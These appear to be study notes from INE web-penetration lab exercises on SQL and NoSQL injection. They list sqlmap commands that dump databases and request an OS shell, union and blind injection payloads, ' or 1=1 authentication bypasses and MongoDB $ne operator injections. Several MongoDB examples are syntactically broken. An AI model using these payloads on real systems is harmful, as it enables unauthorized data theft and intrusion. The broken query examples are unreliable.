## 5. SQL injection

### 5.1. Error based SQL injection

- **Actions**:
  - 1. Use a proxy for interception
  - 2. Use intruder with a preset payload for the sql injection (load txt payload list)
  - 3. The length column tells you the extension of the response. Look for anomalies.

### 5.2. sqlmap

- Install → ```apt install sqlmap```
- **Examples**
  - Error based (manual) → ```sqlmap -u (url) --data "parameter=" -p parameter --method POST```
  - Error based (using request file) → ```sqlmap -r request -p words_exact --technique=E```
  - Error based with current db → ```sqlmap -r request -p words_exact --technique=E --current-db```
  - Error based show tables for db → ```sqlmap -r request -p words_exact --technique=E -D recipes --tables```
  - Error based dump table content → ```sqlmap -r request -p words_exact --technique=E -D recipes -T user --dump```
  - Error based (using OS shell) → ```sqlmap -r request -p words_exact --technique=E --os-shell```
- Use sqlmap outputs in proxies to execute the exploit
- Payloads: https://github.com/swisskyrepo/payloadsallthethings

### 5.3. PHPMyRecipes

- **Steps**:
  - Use exploit db for payload browsing → search by the name of the site
  - Payload → ```sqlmap -u "http://demo.ine.local/dosearch.php" --data "words_exact=" -p words_exact --method POST```
  - Insert the payload in the corresponding text fields → delete restrictions in HTML if present
    - Change values accordingly if statement is successful (extracting the version, for example)

### 5.4. Union based sql lab

- **Scenario** → search bar
  - Identify → use proxy to check if parameters are being passed in the url (might be not shown in browser)
    - Check host and referrals to see if the web is using an API
  - Attempts
    - ```'``` / ```"```
    - ```' or 1=1#```
    - ```' or 1=1;```
    - ```' or 1=1 --```
- **Union satements**:
  - Check number of columns until it matches → ```' or 1=1 union 1,2,3,4,5--```
  - Extract version → ```' or 1=1 union select sqlite_version(),2,3,4,5--```
  - Check table names → ```' or 1=1 union select tbl_name,2,3,4,5 from sqlite_master--```
  - Check schema database → ```' or 1=1 union select 1,2,sql,4,5 from sqlite_master--```
  - Query secret flags table → ```' or 1=1 union select flag,2,value,4,5 from secret_flag--```
 
 ### 5.5 OpenSupports

 - **Target**: bypass authentication with blind sql injection
 - **Source**: INE pdf link
  - https://assets.ine.com/labs/ad-manuals/walkthrough-437.pdf

 ### 5.6. Blind boolean based sql injection

 **Steps**:
  1. Use burp suite or owasp zap
  2. Use open browser
  3. Add payload to the query parameter
  4. Can use the repeater to confirm blind sql injection
    - And / or
    - And can be very useful to confirm facts
      - Example: ```1 and substring(version(),1,1)=4--```

**Hitting with sqlmap**:
  - With a request file → ```sqlmap -r request -p post```
  - List databases → ```sqlmap -r request -p post -dbs```
  - Database and tables  → ```sqlmap -r request -p post -D victor --tables```
  - Table and columns  → ```sqlmap -r request -p post -D victor -T users --columns```
  - Columns dump → ```sqlmap -r request -p post -D victor -T users --columns --dump```

**Using the outcome of sqlmap**
  - Apply sql statements to verify blind sql taking advantage of the values returned by the sqlmap command

 ### 5.7. Victor CMS

 - 1. Abuse post query parameter
 - 2. Always check exploit db
 - 3. Link: https://assets.ine.com/labs/ad-manuals/walkthrough-2267.pdf

 ### 6.1. Mongo DB basics

**Commands**
  - help
  - show dbs
  - use users
  - show collections (show tables)
  - Shows the value of the table → ```db.flag.find()```
  - Find by value → ```db.flag.find({ "user": "heather" })```
  - Count → ```db.current.count()```
  - With operators
    - Greater than → ```db.city.find({"pop":{$gt:100000}})```
    - Less than → ```db.city.find({"pop":{$lt:100000}})```
    - Equal to → ```db.city.find({"pop":{$eq:100000}})```
    - Not equal to → ```db.city.find({"pop":{$ne:100000}})```
  - Compound condition
    - AND → ```db.city.find($and:[{"pop":{$gt:15000}},{"state":"FL"}]})```
    - OR → ```db.city.find($or:[{"pop":{$gt:15000}},{"state":"FL"}]})```
  - Regex
    - ```db.city.find({"city":{$regex:"^H.*"}})```
  - Aggregate
    - ```db.city.find({$group:{"_id":null,avg:{$avg:"$pop"}}})```
  - Order by ascending
    - ```db.city.find().sort({"city":1}).skip(100).limit(1)```

### 6.2. NoSQL injection lab

  - **Commands**
    - In url params, not equal → ```?name[$ne]=admin```
    - Not in array → ```?name[$nin]=admin```
